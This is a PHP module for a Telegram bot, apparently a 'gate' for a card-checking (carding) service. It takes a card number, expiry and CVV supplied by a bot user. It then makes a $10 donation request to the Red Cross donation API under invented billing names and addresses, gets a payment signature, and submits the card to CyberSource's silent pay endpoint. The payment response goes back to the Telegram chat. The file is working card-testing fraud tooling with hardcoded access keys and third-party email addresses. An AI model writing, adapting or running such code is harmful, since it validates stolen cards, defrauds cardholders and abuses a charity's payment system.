<?php 

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
$cc2 = substr($cc[2], -2);
$num    = [];
$num[0] = substr($cc[0],0,4);
$num[1] = substr($cc[0],4,4);
$num[2] = substr($cc[0],8,4);
$num[3] = substr($cc[0],12,4);
# ~ REQ 1 ~ #
$headers1 = ['Host: www.redcross.org', 'content-type: application/json'];
$post1 = '{
    "signature": {
      "signedFields": {
        "unsigned_field_names": "card_type,card_number,card_expiry_date",
        "locale": "en",
        "transaction_type": "sale,create_payment_token",
        "amount": "10.00",
        "currency": "USD",
        "device_fingerprint_id": "0298d57e-fec4-4288-b5fd-f9a340dc33fa",
        "payment_method": "card",
        "bill_to_forename": "'.Name::firstName().'",
        "bill_to_surname": "'.Name::lastName().'",
        "bill_to_email": "lajanel1@alumno.uned.es",
        "bill_to_phone": "150-238-5103",
        "bill_to_address_line1": "NY Street 324",
        "bill_to_address_line2": "",
        "bill_to_address_city": "New York",
        "bill_to_address_state": "NY",
        "bill_to_address_country": "US",
        "bill_to_address_postal_code": "10001"
      }
    },
    "receiptUrl": "https://www.redcross.org/donate/confirmation.html",
    "errorUrl": "https://www.redcross.org/donate/home-fire-campaign.html/",
    "designationId": 100017,
    "donationEntityId": 100035,
    "fdrInfo": {
      "microsite": "false",
      "tpf": false,
      "designationName": "Home Fires",
      "companyName": "",
      "sourceCode": "RSG00000E000",
      "subSourceCode": "homefirecampaign",
      "fundCode": "4905",
      "donationEntityUrl": "/donate/home-fire-campaign",
      "internalDonationPageName": "Home Fire Campaign",
      "donationLanguage": "ENGLISH",
      "premiumOptIn": "false"
    },
    "email": "lajanel1@alumno.uned.es",
    "fdrCustomFields": []
  }';
$site1 = ['url' => 'https://www.redcross.org/api/donate/v1/transactions/creditcard', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
$fim1 = json_decode($req1->body, true);
$signature = $fim1['signature']['value'];
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));

# ~ REQ 2 ~ #
$headers2 = ['Host: secureacceptance.cybersource.com', 'content-type: application/x-www-form-urlencoded'];
$post2 = 'unsigned_field_names=card_type%2Ccard_number%2Ccard_expiry_date&locale=en&transaction_type=sale%2Ccreate_payment_token&amount=10.00&currency=USD&device_fingerprint_id=0298d57e-fec4-4288-b5fd-f9a340dc33fa&payment_method=card&bill_to_forename='.Name::firstName().'&bill_to_surname='.Name::lastName().'&bill_to_email=castillovazquez193%40gmail.com&bill_to_phone=150-238-5103&bill_to_address_line1=Main+Street+353&bill_to_address_line2=&bill_to_address_city=Miami&bill_to_address_state=FL&bill_to_address_country=US&bill_to_address_postal_code=33001&access_key=ecfd7da0c78837669bc81e121a55f302&profile_id=03FFF2BC-8606-4D2B-A7DD-E7AD4AB8888B&signed_date_time=2022-05-10T20%3A58%3A14Z&reference_number=AEME7914977&transaction_uuid=9a9853a3-8b0b-3858-a866-a6331787276a&merchant_defined_data2=https%3A%2F%2Fwww.redcross.org%2Fdonate%2Fconfirmation.html&merchant_defined_data6=https%3A%2F%2Fwww.redcross.org%2Fdonate%2Fhome-fire-campaign.html%2F&merchant_defined_data4=ONETIME&merchant_defined_data3=castillovazquez193%40gmail.com&merchant_defined_data10=100017&merchant_defined_data11=Home+Fires&merchant_defined_data12=100035&merchant_defined_data13=false&merchant_defined_data21=false&merchant_defined_data22=false&merchant_defined_data15=RSG00000E000&merchant_defined_data16=homefirecampaign&merchant_defined_data17=4905&merchant_defined_data18=Home+Fire+Campaign&merchant_defined_data20=%2Fdonate%2Fhome-fire-campaign&merchant_defined_data19=ENGLISH&signed_field_names=unsigned_field_names%2Clocale%2Ctransaction_type%2Camount%2Ccurrency%2Cdevice_fingerprint_id%2Cpayment_method%2Cbill_to_forename%2Cbill_to_surname%2Cbill_to_email%2Cbill_to_phone%2Cbill_to_address_line1%2Cbill_to_address_line2%2Cbill_to_address_city%2Cbill_to_address_state%2Cbill_to_address_country%2Cbill_to_address_postal_code%2Caccess_key%2Cprofile_id%2Csigned_date_time%2Creference_number%2Ctransaction_uuid%2Cmerchant_defined_data2%2Cmerchant_defined_data6%2Cmerchant_defined_data4%2Cmerchant_defined_data3%2Cmerchant_defined_data10%2Cmerchant_defined_data11%2Cmerchant_defined_data12%2Cmerchant_defined_data13%2Cmerchant_defined_data21%2Cmerchant_defined_data22%2Cmerchant_defined_data15%2Cmerchant_defined_data16%2Cmerchant_defined_data17%2Cmerchant_defined_data18%2Cmerchant_defined_data20%2Cmerchant_defined_data19%2Csigned_field_names&card_expiry_date='.$cc[1].'-'.$cc[2].'&card_type=001&signature='.$signature.'&modf-dollar-handle=other&donation=10&modf-frequency=One+Time&payment_method=card&bill_to_forename=Juan&bill_to_surname=Perez&bill_to_email=castillovazquez193%40gmail.com&bill_to_phone=150-238-5103&organizationName=&bill_to_address_line1=Main+Street+353&bill_to_address_line2=&bill_to_address_country=US&bill_to_address_city=Miami&bill_to_address_state=FL&bill_to_address_postal_code=33001&number='.implode('+ ', $num).'&card_number='.$cc[0].'&month='.$cc[1].'&year='.$cc2.'&cvv='.$cc[3];
$site2 = ['url' => 'https://secureacceptance.cybersource.com/silent/pay', 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => null];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, implode('|', $cc), htmlentities($req2->body), $lang['wait']));